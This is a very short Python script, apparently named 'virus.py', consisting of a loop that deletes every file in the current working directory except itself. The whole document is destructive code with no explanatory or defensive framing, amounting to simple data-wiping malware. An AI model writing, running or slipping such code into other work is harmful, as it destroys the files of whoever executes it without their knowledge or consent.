# -*- coding: utf-8 -*-

import os

for file in os.listdir():
    if file != 'virus.py':
        os.remove(file)